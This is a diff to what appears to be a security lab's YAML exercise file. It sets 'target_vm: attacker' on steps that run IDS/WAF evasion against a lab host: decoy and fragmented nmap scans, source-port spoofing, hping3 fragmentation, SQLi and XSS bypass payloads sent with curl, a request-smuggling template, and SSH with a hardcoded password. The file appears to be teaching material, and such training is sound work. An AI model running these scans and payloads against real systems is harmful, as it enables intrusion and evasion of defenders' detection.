@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 'ls /etc/suricata/rules/ 2>/dev/null; echo ---; cat /etc/suricata/rules/local.rules 2>/dev/null | head -20' 2>/dev/null
   risk_level: low
 - order: 2
@@ -36,6 +37,7 @@ steps:
     type: output_contains
     expect: Stealth scan
     field: stdout
+  target_vm: attacker
   script: 'sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null | head -20 && echo ''Stealth scan completed with: T1 timing, fragmentation, 3 random decoys'''
   risk_level: medium
 - order: 3
@@ -51,6 +53,7 @@ steps:
     type: output_contains
     expect: SQLi Evasion
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn SeLeCt'' && echo ''2. Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54''
     && echo ''4. Double URL encoding: %2555%254e%2549%254f%254e'' && echo ''5. Null byte: UNION%00SELECT'' && echo ''6. Tab/newline: UNION%09SELECT, UNION%0aSELECT'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--''
     | head -c 200'
@@ -68,6 +71,7 @@ steps:
     type: output_contains
     expect: XSS Evasion
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler: <img src=x onerror=alert(1)>'' && echo ''2. SVG: <svg onload=alert(1)>'' && echo ''3. Body: <body onload=alert(1)>'' && echo
     ''4. Encoded: <img src=x onerror=\x61\x6c\x65\x72\x74(1)>'' && echo ''5. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>'' && echo ''6. Template literal: ${alert(1)}'' && echo
     ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>'' | head -c 200'
@@ -83,6 +87,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 && echo '---' && echo 'Source port 53 (DNS) often allowed through firewalls'
   risk_level: medium
 - order: 6
@@ -98,6 +103,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Default (curl) ==='' && curl -sI http://10.20.30.80:3000 2>/dev/null | grep -i server && echo ''=== Spoofed (Chrome) ==='' && curl -sI -H ''User-Agent: Mozilla/5.0 (Windows NT 10.0;
     Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'' http://10.20.30.80:3000 2>/dev/null | grep -i server && echo ''---'' && echo ''WAFs often block known scanner User-Agents
     (Nikto, sqlmap, Nmap)'''
@@ -114,6 +120,7 @@ steps:
     type: output_contains
     expect: fragmentation
     field: stdout
+  target_vm: attacker
   script: sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 2>&1 | head -10 && echo '---' && echo 'IP fragmentation splits payload across multiple packets' && echo 'IDS must reassemble fragments to detect signatures'
     && echo 'Some IDS fail to reassemble overlapping or out-of-order fragments'
   risk_level: medium
@@ -130,6 +137,7 @@ steps:
     type: output_contains
     expect: Request Smuggling
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== HTTP Request Smuggling ==='' && echo ''CL-TE attack:'' && echo ''POST / HTTP/1.1'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding: chunked'' && echo '''' && echo ''0''
     && echo '''' && echo ''SMUGGLED'' && echo ''---'' && echo ''When front-end (WAF) uses CL and back-end uses TE,'' && echo ''the SMUGGLED part is treated as a new request by the back-end'' && echo ''This
     bypasses WAF inspection entirely'''
@@ -145,6 +153,7 @@ steps:
     type: output_contains
     expect: alert
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 'tail -30 /var/log/suricata/fast.log 2>/dev/null || echo "No alerts found"' 2>/dev/null
   risk_level: low
 - order: 10
@@ -159,6 +168,7 @@ steps:
     type: output_contains
     expect: Random delays
     field: stdout
+  target_vm: attacker
   script: 'for i in 1 2 3; do DELAY=$((RANDOM % 3 + 1)); echo "Request $i: delay ${DELAY}s"; curl -s -o /dev/null -w ''HTTP %{http_code}'' http://10.20.30.80:3000/api/Products; echo; sleep $DELAY; done
     && echo ''---'' && echo ''Random delays break IDS time-correlation patterns'''
   risk_level: medium
@@ -174,6 +184,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: 'sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''ip -6 addr show 2>/dev/null'' 2>/dev/null && echo ''---'' && echo ''IPv6 evasion: many IDS/firewalls only inspect IPv4 traffic''
     && echo ''If dual-stack is enabled, IPv6 traffic may bypass security controls'''
   risk_level: medium
@@ -190,6 +201,7 @@ steps:
     type: output_contains
     expect: WAF Bypass SQLi
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== WAF Bypass SQLi Payloads ==='' && for payload in "''%20OR%201%3D1--" "''%20oR%20''1''%3D''1''--" "''%20OR%20true--" "''+OR+''1''%3D''1''--" "''%20||%201%3D1--"; do echo -n "Payload:
     $payload -> "; curl -s -o /dev/null -w ''HTTP %{http_code}'' -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d "{\"email\":\"$payload\",\"password\":\"a\"}"; echo;
     done'
@@ -207,6 +219,7 @@ steps:
     type: output_contains
     expect: Suricata Rule Analysis
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Suricata Rule Analysis ==='' && echo ''Example rule:'' && echo ''alert http any any -> any any (msg:"SQL Injection"; content:"UNION"; nocase; content:"SELECT"; nocase; sid:1000001;)''
     && echo '''' && echo ''Evasion strategies:'' && echo ''1. Split keywords: UNI/**/ON SEL/**/ECT (breaks content match)'' && echo ''2. URL encoding: %55NION %53ELECT'' && echo ''3. Alternative syntax:
     UNION ALL SELECT'' && echo ''4. Double encoding: %2555NION'' && echo ''5. Unicode: \u0055NION'''
@@ -224,6 +237,7 @@ steps:
     type: output_contains
     expect: Anti-fingerprinting
     field: stdout
+  target_vm: attacker
   script: 'sudo nmap -sS --data-length 50 --randomize-hosts --max-retries 1 -p 80,3000 10.20.30.80 && echo ''---'' && echo ''Anti-fingerprinting options:'' && echo ''--data-length: adds random padding to
     avoid signature detection'' && echo ''--randomize-hosts: randomizes target order in multi-host scans'' && echo ''--scan-delay: adds delay between probes'' && echo ''--badsum: sends packets with invalid
     checksums (tests IDS response)'''
@@ -243,6 +257,7 @@ steps:
     type: output_contains
     expect: Evasion Techniques Report
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Evasion Techniques Report ===\n\n[Tested Techniques]\n1. Slow scan (T1 timing) - Avoid time-based detection\n2. IP fragmentation - Break signature matching\n3. Source port spoofing
     - Bypass firewall rules\n4. SQLi encoding variations - WAF bypass\n5. XSS alternative payloads - WAF bypass\n6. User-Agent spoofing - Tool detection bypass\n7. Random timing - Break correlation\n8.
     Data length padding - Signature evasion\n\n[Effectiveness]\n- Most effective: encoding + timing combination\n- Least effective: simple case mixing (modern WAFs handle)\n\n[Security Hardening]\n1. Suricata:
